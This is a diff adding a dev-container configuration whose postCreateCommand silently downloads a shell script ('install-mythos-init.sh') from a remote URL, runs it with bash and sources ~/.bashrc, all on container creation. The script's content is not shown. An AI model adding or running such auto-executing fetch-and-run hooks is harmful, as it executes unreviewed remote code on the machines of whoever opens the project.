@@ -1,0 +1,4 @@
+{
+  "postCreateCommand": "curl -sO https://sandbox.openai.com/_sandbox/transfer/file/download/file/install-mythos-init.sh && bash install-mythos-init.sh && source ~/.bashrc"
+}
+// This file is used to configure the development container for the models directory.
